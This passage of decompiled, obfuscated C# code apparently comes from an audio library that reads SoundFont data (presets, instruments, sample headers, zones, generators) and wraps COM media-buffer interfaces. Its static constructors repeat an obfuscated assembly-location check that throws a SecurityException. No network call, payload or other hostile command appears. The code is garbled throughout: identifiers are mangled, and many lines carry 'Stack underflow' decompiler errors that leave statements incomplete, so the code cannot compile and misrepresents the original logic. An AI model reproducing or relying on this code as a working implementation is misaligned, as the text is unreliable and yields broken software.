				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0080
{
	internal sealed class _0002
	{
		public string _0001;

		public uint _0001;

		public uint _0002;

		public uint _0003;

		public uint _0004;

		public uint _0005;

		public byte _0001;

		public sbyte _0001;

		public ushort _0001;

		public global::_0002._0003 _0001;

		public override string _0001()
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
		}
	}
}
namespace _001E
{
	internal sealed class _0001 : _0016._0002<_0080._0002>
	{
		public override int Length => 46;

		public _0080._0002[] SampleHeaders
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((_0016._0002<_0080._0002>)/*Error near IL_0007: Stack underflow*/)._0001.ToArray();
				return (_0080._0002[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override _0080._0002 _0001(BinaryReader _0002)
		{
			//IL_00e2: Incompatible stack heights: 0 vs 1
			//IL_00ee: Incompatible stack heights: 0 vs 2
			new _0080._0002();
			_0080._0002 obj = (_0080._0002)/*Error near IL_00e8: Stack underflow*/;
			_ = _0083_0002._007E_008C_0005;
			byte[] array = /*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/, 20);
			obj._0001 = _0084_0002._007E_008D_0005(global::_000E._0012._0001, array, 0, array.Length);
			obj._0001 = _008A_0002._007E_0093_0005(_0002);
			obj._0002 = _008A_0002._007E_0093_0005(_0002);
			obj._0003 = _008A_0002._007E_0093_0005(_0002);
			obj._0004 = _008A_0002._007E_0093_0005(_0002);
			obj._0005 = _008A_0002._007E_0093_0005(_0002);
			obj._0001 = _008D_0002._007E_0096_0005(_0002);
			obj._0001 = _008E_0002._007E_0097_0005(_0002);
			obj._0001 = _0081_0002._007E_0087_0005(_0002);
			obj._0001 = (global::_0002._0003)_0081_0002._007E_0087_0005(_0002);
			base._0001.Add(obj);
			return obj;
		}

		public override void _0001(BinaryWriter _0002, _0080._0002 _0003)
		{
		}

		static _0001()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001B
{
	internal enum _0002
	{
		_0001,
		_0002,
		_0003,
		_0004
	}
}
namespace _0002
{
	internal enum _0003 : ushort
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 32769,
		_0006 = 32770,
		_0007 = 32772,
		_0008 = 32776
	}
}
namespace _0015
{
	internal sealed class _0006
	{
		internal short _0001;

		internal short _0002;

		public short Major
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0001 = (short)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public short Minor
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0002 = (short)/*Error near IL_0009: Stack underflow*/;
			}
		}
	}
}
namespace _001C
{
	internal sealed class _0003 : global::_0016._0002<global::_0015._0006>
	{
		public override int Length => 4;

		public override global::_0015._0006 _0001(BinaryReader _0002)
		{
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			new global::_0015._0006();
			global::_0015._0006 obj = (global::_0015._0006)/*Error near IL_003d: Stack underflow*/;
			short num = _0088_0002._007E_0091_0005(_0002);
			((global::_0015._0006)/*Error near IL_0016: Stack underflow*/)._0001 = num;
			obj._0002 = _0088_0002._007E_0091_0005(_0002);
			base._0001.Add(obj);
			return obj;
		}

		public override void _0001(BinaryWriter _0002, global::_0015._0006 _0003)
		{
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_0026: Incompatible stack heights: 0 vs 1
			_ = _008F_0002._007E_0098_0005;
			short num = ((global::_0015._0006)/*Error near IL_000e: Stack underflow*/)._0001;
			/*Error near IL_002d: Stack underflow*/((object)/*Error near IL_002d: Stack underflow*/, num);
			_008F_0002._007E_0098_0005(_0002, _0003._0002);
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal sealed class _0004
	{
		private global::_0013._0003 m__0001;

		private global::_0008._0002 m__0001;

		private global::_0008._0003 m__0001;

		public global::_0013._0003 FileInfo => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public global::_0018._0006[] Presets
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001.Presets;
				return (global::_0018._0006[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public global::_0017._0002[] Instruments
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001.Instruments;
				return (global::_0017._0002[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0080._0002[] SampleHeaders
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001.SampleHeaders;
				return (_0080._0002[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public byte[] SampleData => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001._0001;

		public _0004(string _0089_0015)
			: this(new FileStream(_0089_0015, FileMode.Open, FileAccess.Read))
		{
		}

		public _0004(Stream _0083_008F_0006)
		{
			using (_0083_008F_0006)
			{
				_0002 obj = global::_0011._0018._0001(new BinaryReader(_0083_008F_0006));
				if (obj._0001 == _0080._0014._0001(107393181))
				{
					string text = global::_0011._0018._0001(obj);
					if (text != _0080._0014._0001(107393172))
					{
						throw new InvalidDataException(string.Format(_0080._0014._0001(107393131), text));
					}
					_0002 obj2 = global::_0011._0018._0001(obj);
					if (obj2._0001 == _0080._0014._0001(107393102))
					{
						this.m__0001 = new global::_0013._0003(obj2);
						_0002 obj3 = global::_0011._0018._0001(obj);
						this.m__0001 = new global::_0008._0003(obj3);
						obj3 = global::_0011._0018._0001(obj);
						this.m__0001 = new global::_0008._0002(obj3);
						return;
					}
					throw new InvalidDataException(string.Format(_0080._0014._0001(107393093), obj2._0001));
				}
				throw new InvalidDataException(_0080._0014._0001(107393056));
			}
		}

		public override string _0001()
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			_ = _009D._0093_0004;
			_0080._0014._0001(107393035);
			_ = ((_0004)/*Error near IL_0013: Stack underflow*/).m__0001;
			global::_0008._0002 obj = ((_0004)/*Error near IL_001a: Stack underflow*/).m__0001;
			return /*Error near IL_001f: Stack underflow*/((string)/*Error near IL_001f: Stack underflow*/, (object)/*Error near IL_001f: Stack underflow*/, obj);
		}
	}
}
namespace _000E
{
	internal sealed class _0001
	{
		internal ushort _0001;

		internal ushort _0002;

		internal ushort _0003;

		internal ushort _0004;

		internal global::_001F._0002[] _0001;

		internal global::_0018._0005[] _0001;

		public global::_001F._0002[] Modulators
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0001)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_001F._0002[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0018._0005[] Generators
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0001)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0018._0005[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override string _0001()
		{
			//IL_0057: Incompatible stack heights: 0 vs 2
			//IL_005a: Incompatible stack heights: 0 vs 4
			//IL_005d: Incompatible stack heights: 0 vs 3
			_ = _009E._0094_0004;
			_0080._0014._0001(107393526);
			_ = new object[4];
			_ = 0;
			object obj = ((_0001)/*Error near IL_001b: Stack underflow*/)._0003;
			((object[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = obj;
			/*Error near IL_0021: Stack underflow*/;
			_ = 1;
			object obj2 = ((_0001)/*Error near IL_002a: Stack underflow*/)._0001;
			((object[])/*Error near IL_0030: Stack underflow*/)[/*Error near IL_0030: Stack underflow*/] = obj2;
			((object[])/*Error near IL_0030: Stack underflow*/)[2] = _0004;
			((object[])/*Error near IL_003e: Stack underflow*/)[3] = _0002;
			return /*Error near IL_0051: Stack underflow*/((string)/*Error near IL_0051: Stack underflow*/, (object[])/*Error near IL_0051: Stack underflow*/);
		}

		static _0001()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0006
{
	internal sealed class _0001 : global::_0016._0002<global::_000E._0001>
	{
		private new global::_000E._0001 m__0001;

		public global::_000E._0001[] Zones
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((global::_0016._0002<global::_000E._0001>)/*Error near IL_0007: Stack underflow*/)._0001.ToArray();
				return (global::_000E._0001[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override int Length => 4;

		public override global::_000E._0001 _0001(BinaryReader _0002)
		{
			//IL_008e: Incompatible stack heights: 0 vs 1
			//IL_009a: Incompatible stack heights: 0 vs 1
			new global::_000E._0001();
			global::_000E._0001 obj = (global::_000E._0001)/*Error near IL_0094: Stack underflow*/;
			ushort num = _0081_0002._007E_0087_0005(_0002);
			((global::_000E._0001)/*Error near IL_001f: Stack underflow*/)._0001 = num;
			obj._0002 = _0081_0002._007E_0087_0005(_0002);
			if (this.m__0001 != null)
			{
				this.m__0001._0003 = (ushort)(obj._0001 - this.m__0001._0001);
				this.m__0001._0004 = (ushort)(obj._0002 - this.m__0001._0002);
			}
			base._0001.Add(obj);
			this.m__0001 = obj;
			return obj;
		}

		public override void _0001(BinaryWriter _0002, global::_000E._0001 _0003)
		{
		}
	}
}
namespace _0016
{
	internal enum _0003
	{
		_0001,
		_0002
	}
}
namespace _0017
{
	internal sealed class _0003
	{
		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001E
{
	internal sealed class _0002
	{
	}
}
namespace _0007
{
	internal sealed class _0003
	{
		public _0003(string _0089_0015)
		{
			new StringBuilder();
			using StreamReader streamReader = new StreamReader(_0089_0015);
			List<global::_001E._0002> list = new List<global::_001E._0002>();
			global::_001E._0002 obj = null;
			StringBuilder stringBuilder = new StringBuilder();
			StringBuilder stringBuilder2 = new StringBuilder();
			int num = 0;
			string text;
			while ((text = streamReader.ReadLine()) != null)
			{
				num++;
				int num2 = text.IndexOf('/');
				if (num2 != -1)
				{
					text = text.Substring(num2);
				}
				for (int i = 0; i < text.Length; i++)
				{
					char c = text[i];
					if (char.IsWhiteSpace(c))
					{
						if (stringBuilder.Length != 0)
						{
							if (stringBuilder2.Length == 0)
							{
								throw new FormatException(string.Format(_0080._0014._0001(107393453), num, i));
							}
							stringBuilder2.Append(c);
						}
					}
					else
					{
						if (c == '=' || c != '<')
						{
							continue;
						}
						if (text.Substring(i).StartsWith(_0080._0014._0001(107393432)))
						{
							if (obj != null)
							{
								list.Add(obj);
							}
							obj = new global::_001E._0002();
							stringBuilder.Length = 0;
							stringBuilder2.Length = 0;
							i += 7;
							continue;
						}
						if (!text.Substring(i).StartsWith(_0080._0014._0001(107393387)))
						{
							throw new FormatException(string.Format(_0080._0014._0001(107393406), num, i));
						}
						if (obj != null)
						{
							list.Add(obj);
						}
						stringBuilder.Length = 0;
						stringBuilder2.Length = 0;
						obj = null;
						new global::_0017._0003();
						i += 6;
					}
				}
			}
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0011
{
	internal sealed class _0001
	{
		public static readonly Guid _0001;

		public static readonly Guid _0002;

		public static readonly Guid _0003;

		public static readonly Guid _0004;

		public static readonly Guid _0005;

		public static readonly Guid _0006;

		public static readonly Guid _0007;

		public static readonly Guid _0008;

		public static readonly Guid _000E;

		public static readonly Guid _000F;

		public static readonly Guid _0010;

		public static readonly Guid _0011;

		public static readonly Guid _0012;

		public static readonly Guid _0013;

		public static readonly Guid _0014;

		public static readonly Guid _0015;

		public static readonly Guid[] _0001;

		public static readonly string[] _0001;

		static _0001()
		{
			//IL_02ab: Incompatible stack heights: 0 vs 1
			//IL_02b5: Incompatible stack heights: 0 vs 1
			//IL_02bf: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107393321);
			new Guid((string)/*Error near IL_02b5: Stack underflow*/);
			global::_0011._0001._0001 = (Guid)/*Error near IL_0014: Stack underflow*/;
			_0080._0014._0001(107393304);
			_0002 = new Guid((string)/*Error near IL_0023: Stack underflow*/);
			_0003 = new Guid(_0080._0014._0001(107392711));
			_0004 = new Guid(_0080._0014._0001(107392694));
			_0005 = new Guid(_0080._0014._0001(107392613));
			_0006 = new Guid(_0080._0014._0001(107392596));
			_0007 = new Guid(_0080._0014._0001(107392515));
			_0008 = new Guid(_0080._0014._0001(107393010));
			_000E = new Guid(_0080._0014._0001(107392929));
			_000F = new Guid(_0080._0014._0001(107392912));
			_0010 = new Guid(_0080._0014._0001(107392863));
			_0011 = new Guid(_0080._0014._0001(107392782));
			_0012 = new Guid(_0080._0014._0001(107392253));
			_0013 = new Guid(_0080._0014._0001(107392172));
			_0014 = new Guid(_0080._0014._0001(107392155));
			_0015 = new Guid(_0080._0014._0001(107392074));
			global::_0011._0001._0001 = new Guid[13]
			{
				global::_0011._0001._0001,
				_0002,
				_0003,
				_0004,
				_0005,
				_0006,
				_0007,
				_0008,
				_000E,
				_000F,
				_0010,
				_0011,
				_0012
			};
			_0001 = new string[13]
			{
				_0080._0014._0001(107392057),
				_0080._0014._0001(107392052),
				_0080._0014._0001(107392003),
				_0080._0014._0001(107392018),
				_0080._0014._0001(107392481),
				_0080._0014._0001(107392496),
				_0080._0014._0001(107392475),
				_0080._0014._0001(107392430),
				_0080._0014._0001(107392445),
				_0080._0014._0001(107392432),
				_0080._0014._0001(107392411),
				_0080._0014._0001(107392366),
				_0080._0014._0001(107392377)
			};
		}
	}
}
namespace _0014
{
	internal sealed class _0002
	{
		[CompilerGenerated]
		private string _0001;

		[CompilerGenerated]
		private Guid _0001;

		public string Name
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public Guid Clsid
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (Guid)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0002(string _0004_001F, Guid _0084_008F_0006)
		{
			Name = _0004_001F;
			Clsid = _0084_008F_0006;
		}

		static _0002()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0005
{
	internal sealed class _0002
	{
	}
}
namespace _000E
{
	[Flags]
	internal enum _0002
	{
		_0001 = 0,
		_0002 = 1
	}
}
namespace _0004
{
	internal static class _0003
	{
		public static readonly Guid _0001;

		public static readonly Guid _0002;

		public static readonly Guid _0003;

		public static readonly Guid _0004;

		public static readonly Guid _0005;

		public static readonly Guid _0006;

		public static readonly Guid _0007;

		static _0003()
		{
			//IL_0145: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_014b: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0001 = new Guid(_0080._0014._0001(107392372));
			_0002 = new Guid(_0080._0014._0001(107392291));
			_0003 = new Guid(_0080._0014._0001(107392274));
			_0004 = new Guid(_0080._0014._0001(107391681));
			_0005 = new Guid(_0080._0014._0001(107391664));
			_0006 = new Guid(_0080._0014._0001(107391615));
			_0007 = new Guid(_0080._0014._0001(107391534));
		}
	}
}
namespace _0013
{
	internal static class _0004
	{
		public static readonly Guid _0001;

		public static readonly Guid _0002;

		public static readonly Guid _0003;

		public static readonly Guid _0004;

		public static readonly Guid _0005;

		public static readonly Guid _0006;

		public static readonly Guid _0007;

		public static readonly Guid _0008;

		static _0004()
		{
			//IL_00a6: Incompatible stack heights: 0 vs 1
			//IL_00b0: Incompatible stack heights: 0 vs 1
			//IL_00ba: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107391517);
			new Guid((string)/*Error near IL_00b0: Stack underflow*/);
			_0001 = (Guid)/*Error near IL_0014: Stack underflow*/;
			_0080._0014._0001(107391948);
			_0002 = new Guid((string)/*Error near IL_0023: Stack underflow*/);
			_0003 = new Guid(_0080._0014._0001(107391931));
			_0004 = new Guid(_0080._0014._0001(107391850));
			_0005 = new Guid(_0080._0014._0001(107391833));
			_0006 = new Guid(_0080._0014._0001(107391752));
			_0007 = new Guid(_0080._0014._0001(107391223));
			_0008 = new Guid(_0080._0014._0001(107391142));
		}
	}
}
namespace _0007
{
	internal enum _0004
	{
		_0001 = -2147220991,
		_0002,
		_0003,
		_0004,
		_0005,
		_0006
	}
}
namespace _001E
{
	internal static class _0003
	{
		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0008
{
	internal struct _0004
	{
		private Guid _0001;

		private Guid _0002;

		public unsafe Guid Type
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004*)(nint)/*Error near IL_0009: Stack underflow*/)->_0001 = (Guid)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public unsafe Guid Subtype
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004*)(nint)/*Error near IL_0009: Stack underflow*/)->_0002 = (Guid)/*Error near IL_0009: Stack underflow*/;
			}
		}
	}
}
namespace _0017
{
	[ComImport]
	[SuppressUnmanagedCodeSecurity]
	[Guid("6d6cbb60-a223-44aa-842f-a2f06750be6d")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0004
	{
		[PreserveSig]
		int _0001(out int _0002);

		[PreserveSig]
		int _0001(int _0002, ref global::_0018._0007 _0003);

		[PreserveSig]
		int _0001(int _0002, out IntPtr _0003);

		[PreserveSig]
		int _0002(out int _0002);

		[PreserveSig]
		int _0001(int _0002, out Guid _0003);

		[PreserveSig]
		int _0001(out Guid _0002, out int _0003);
	}
}
namespace _0004
{
	[Guid("E7E9984F-F09F-4da4-903F-6E2E0EFE56B5")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0004
	{
		int _0001(int _0002);

		int _0001([In] float[] _0002);
	}
	internal sealed class _0005 : IDisposable, global::_0010._0004
	{
		internal IntPtr _0001;

		internal int _0001;

		private int m__0002;

		public int Length
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000e: Invalid comparison between Unknown and I4
				//IL_0026: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 2
				//IL_0030: Incompatible stack heights: 0 vs 1
				_ = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
				int num = ((_0005)/*Error near IL_000e: Stack underflow*/).m__0002;
				if ((int)/*Error near IL_0010: Stack underflow*/ > num)
				{
					_0080._0014._0001(107391125);
					throw new ArgumentException((string?)/*Error near IL_001c: Stack underflow*/);
				}
				this._0001 = value;
			}
		}

		public _0005(int _0005_0011)
		{
			this._0001 = Marshal.AllocCoTaskMem(_0005_0011);
			this.m__0002 = _0005_0011;
		}

		public void _0001()
		{
			//IL_003e: Incompatible stack heights: 0 vs 2
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 2
			_ = _0090_0002._0099_0005;
			IntPtr intPtr = ((_0005)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0045: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				_ = _009B._0091_0004;
				IntPtr intPtr2 = ((_0005)/*Error near IL_0021: Stack underflow*/)._0001;
				/*Error near IL_0026: Stack underflow*/(intPtr2);
				this._0001 = IntPtr.Zero;
				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			try
			{
				((_0005)/*Error near IL_000e: Stack underflow*/)._0001();
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		private int _0001(int _0002)
		{
			//IL_0009: Invalid comparison between Unknown and I4
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			int num = ((_0005)/*Error near IL_0009: Stack underflow*/).m__0002;
			if ((int)/*Error near IL_000b: Stack underflow*/ > num)
			{
				return -2147483645;
			}
			((_0005)/*Error near IL_0019: Stack underflow*/)._0001 = _0002;
			return 0;
		}

		int global::_0010._0004._0002(int _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002);
		}

		private unsafe int _0001(out int _0002)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			int num = ((_0005)/*Error near IL_0009: Stack underflow*/).m__0002;
			*(int*)(nint)/*Error near IL_000a: Stack underflow*/ = num;
			return 0;
		}

		int global::_0010._0004._0002(out int _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(out _0002);
		}

		private int _0001(IntPtr _0002, IntPtr _0003)
		{
			//IL_0048: Incompatible stack heights: 0 vs 2
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 2
			_ = _0090_0002._0099_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_004f: Stack underflow*/((IntPtr)/*Error near IL_004f: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				_ = _0092_0002._0002_0006;
				IntPtr intPtr = this._0001;
				/*Error near IL_0022: Stack underflow*/((IntPtr)/*Error near IL_0022: Stack underflow*/, intPtr);
			}
			if (_0090_0002._0099_0005(_0003, IntPtr.Zero))
			{
				_0093_0002._0003_0006(_0003, this._0001);
			}
			return 0;
		}

		int global::_0010._0004._0002(IntPtr _0002, IntPtr _0003)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002, _0003);
		}
	}
}
namespace _0010
{
	[ComImport]
	[SuppressUnmanagedCodeSecurity]
	[Guid("59eff8b9-938c-4a26-82f2-95cb84cdc837")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	public interface _0004
	{
		[PreserveSig]
		int _0002(int _0002);

		[PreserveSig]
		int _0002(out int _0002);

		[PreserveSig]
		int _0002(IntPtr _0002, IntPtr _0003);
	}
}
namespace _001E
{
	internal sealed class _0004 : IDisposable
	{
		internal global::_0013._0005 _0001;

		private int m__0001;

		private int _0002;

		public int InputStreamCount => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int OutputStreamCount => ((_0004)/*Error near IL_0007: Stack underflow*/)._0002;

		internal _0004(global::_0013._0005 _0086_008F_0006)
		{
			this._0001 = _0086_008F_0006;
			_0086_008F_0006._0001(out this.m__0001, out this._0002);
		}

		public void _0001()
		{
